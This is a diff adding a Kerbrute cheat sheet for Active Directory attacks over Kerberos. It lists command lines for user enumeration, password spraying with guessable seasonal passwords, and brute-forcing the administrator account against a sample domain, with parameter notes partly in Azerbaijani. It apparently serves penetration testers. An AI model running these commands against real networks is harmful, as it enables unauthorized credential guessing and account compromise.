@@ -1,1 +1,33 @@
+# =========================
+# KERBRUTE CHEAT SHEET
+# =========================
+# Tool      : Kerbrute
+# Protocol  : Kerberos (TCP/88)
+# Purpose   : AD User Enumeration, Password Spraying, Limited Bruteforce
+# Language  : Go
+# Noise     : Low (No LDAP/SMB)
+# =========================
 
+# -------- USER ENUMERATION --------
+
+kerbrute userenum -d contoso.local users.txt
+kerbrute userenum -d contoso.local --dc 192.168.1.10 users.txt
+kerbrute userenum -d contoso.local users.txt -t 20
+kerbrute userenum -d contoso.local users.txt -o valid_users.txt
+
+kerbrute passwordspray -d contoso.local users.txt Spring2025!
+kerbrute passwordspray -d contoso.local users.txt Welcome123 -t 10 --delay 200ms
+kerbrute passwordspray -d contoso.local --dc 192.168.1.10 users.txt P@ssw0rd!
+
+kerbrute passwordspray -d contoso.local users.txt Winter2024! -o valid_creds.txt
+kerbrute bruteuser -d contoso.local passwords.txt administrator
+kerbrute bruteuser -d contoso.local passwords.txt administrator -t 5 --delay 300ms
+
+
+# -------- FAYDALI PARAMETRLƏR --------
+# -d        : Domain name
+# --dc      : Domain Controller IP
+# -t        : Thread sayı
+# --delay   : Sorğular arası gecikmə
+# -v        : Verbose output
+# -o        : Output faylı
